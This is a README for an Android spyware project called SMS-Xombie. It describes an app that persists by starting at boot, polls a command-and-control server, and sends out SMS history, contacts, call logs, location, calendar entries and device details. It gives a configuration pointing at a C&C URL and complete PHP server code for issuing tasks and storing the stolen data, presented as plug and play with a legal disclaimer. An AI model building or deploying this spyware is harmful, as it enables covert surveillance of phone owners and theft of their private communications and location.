# SMS-Xombie ![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
An Android spyware which interacts with a remote C&C server to exfiltrate phone data. Works with the latest SDK (29). Read the full article at https://artikrh.github.io/posts/sms-xombie

### Table of Contents
  - [1. Overview](#1-overview)
  - [2. Implementation](#2-implementation)
      - [2.1. Android Application](#21-android-application)
      - [2.2. Xombie Platform](#22-xombie-platform)
  - [3. Capabilities](#3-capabilities)
  - [4. Usage](#4-usage)

## 1. Overview
The objective of this project is the deployment of an Android application which interacts with a remote Command & Control (C&C) server as a spyware. SMS Xombie also features a Raspberry Pi equipped with a Global System for Mobile (GSM) antenna for the sole purpose of receiving commands from a controller mobile phone. In short, the app package—considered as a unique "zombie" device—communicates with the server using HyperText Transfer Protocol (HTTP) GET to fetch commands through JavaScript Object Notation (JSON) and HTTP POST to send sensitive data such as SMS logs, contacts book or geographical position back to the server – which gets parsed from a Hypertext Preprocessor (PHP) script.

## 2. Implementation
### 2.1. Android Application
The app itself contains the following two (2) modules:
* Fetcher Service - performs key operations in the background and does not require user interaction;
* Autostart Receiver - a component triggered by the boot completion event to invoke the above service.

When the application gets installed and opened, it will register the receiver which will be invoked during Android boot time `RECEIVE_BOOT_COMPLETED` (after system services get fully loaded that is). The main function of this `BroadcastReceiver` is to schedule an `AlarmManager` to start the Fetcher service periodically, thus making it persistent in the device.  

Within the Fetcher service, there are several parts of code starting from `onStartCommand()` which:
* Checks or stores permanently a random generated Universal Unique Identifier (UUID) to uniquely identify the device;
* Validates device's network connection and remote server reachability.

Initially, a device GUID is generated to uniquely identify a "zombie". This ID is later used as a query parameter in its regular GET requests to an API end-point (PHP) which responds JSON encoded data, hence, `JsonObject()` is used along `HttpURLConnection` to interact with the API. The response is handled by the `onPostExecute()` function if the connection was successful and there is a network connectivity as per the `isConnected()` boolean method. 

![PoC](https://i.imgur.com/Nfw5iOg.png)

If everything is correct, the mobile will respond to the task accordingly; whereas to send the data back, I used the Volley HTTP library which makes networking in Android apps easier.

![PoC](https://i.imgur.com/RqUMyry.png)

### 2.2. Xombie Platform

The application itself is a part of a larger system - the Xombie Platform - that we are going to elaborate next. The idea is simple, using a simple SMS message over the GSM network, we are able to control multiple devices that run the APK through the CC server. The implementation however, is complex due to the following process:

1. Implementation of a Rasberry Pi device with a GSM shield attached to fetch SMS messages from a controller mobile phone over the GSM network;
2. Build of an interconnection mechanism between the API and physical device;
3. The ability to distinguishably process incoming traffic from the other mobile devices and respond with the appropiate content of that device.

For the larger picture, the above procedure is illustrated in the following scheme:

![architecture](https://i.imgur.com/uQySpSE.png)

Initially, the controller device sends a command through an SMS message to retrieve all of the mobile phones geographical location (`getGeoLocation` keyword). The GSM shield, which can operate in Quad 850/900/1800/1900 MHz frequency bands, uses a local SIM card to receive the message, forward the SMS content to the [smsXlib](https://github.com/ButrintKomoni/smsXlib) API, which then queues the task to the hosting server. Considering the mobile devices sends HTTP requests periodically to check whether there is something to do, in this case, they would immediately send relevant latitude and longitude values as a POST request (given that the user has given the application location service permission).

### 3. Capabilities

As of now, the android app has these capabilities:
* SMS dump (`smsdump`) - Dumps the entire message history;
* Contacts dump (`contactsDump`) - Dumps the entire contact list;
* Call Logs Dump (`callsDump`) - Dumps call entries;
* Geographical Location Fetch (`getGeoLocation`) - Retrieves device's current latitude and longitude values;
* Application List Dump (`appsDump`) - Lists user installed applications;
* Device Information Retrieval (`deviceInfo`) - Outputs device hardware and software information;
* Calendar Entries Dump (`calendarsDump`) - Dumps existing calendar entries;
* Service Termination (`kill`) - Terminates the running service until the next boot.

### 4. Usage
The program is meant to basically plug in and play; you only have to modify the C&C URL value in the `res/values/strings.xml` resource file:
```
<resources>
    <string name="app_name">Xombie</string>
    <string name="cc_php">http://192.168.0.14/cc.php</string>
    <string name="milliseconds">60000</string>
</resources>
```
The serving PHP script should be set up as below:
```
<?php

if ($_SERVER["REQUEST_METHOD"] == "GET") {
	if (isset($_GET["uuid"]) && !empty($_GET["uuid"])) {
		$id = sanitize($_GET["uuid"]);
		if (preg_match("/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i", $id)) {
			// Available: kill, smsDump, contactsDump, callsDump, getGeoLocation, appsDump, deviceInfo, calendarsDump
			$json = [ 'uuid' => $id, 'task' => 'getGeoLocation' ];
			header('Content-type:application/json;charset=utf-8');
			echo json_encode($json);
		}
		else {
			echo "Incorrect UUID format";
		}
	}
	else {
		echo "UUID not set";
	}
}
else if ($_SERVER["REQUEST_METHOD"] == "POST") {
	if (!isset($_POST['task']) || !isset($_POST['uuid']) || !isset($_POST['data'])) {
		die("Incorrect POST parameters");
	}

	$id = sanitize($_POST['uuid']);
	$task = sanitize($_POST['task']);
	$data = $_POST['data'];

	if (empty($id) || empty($task) || empty($data)) {
		die("Parameters cannot be empty");
	}

	$data = rawurldecode($data);
	$data = base64_decode($data);
	$data = gzdecode($data);

	file_put_contents('output.txt', $data);
}

function sanitize($data)
{
	$data = trim($data);
	$data = stripslashes($data);
	$data = htmlspecialchars($data);
	return $data;
}

?>
```

## Disclaimer
```
[!] Legal disclaimer: Usage of this application for attacking targets without
prior mutual consent is illegal. It is the end user's responsibility
to obey all applicable local, state and federal laws. I assume
no liability and are not responsible for any misuse or damage caused.
```
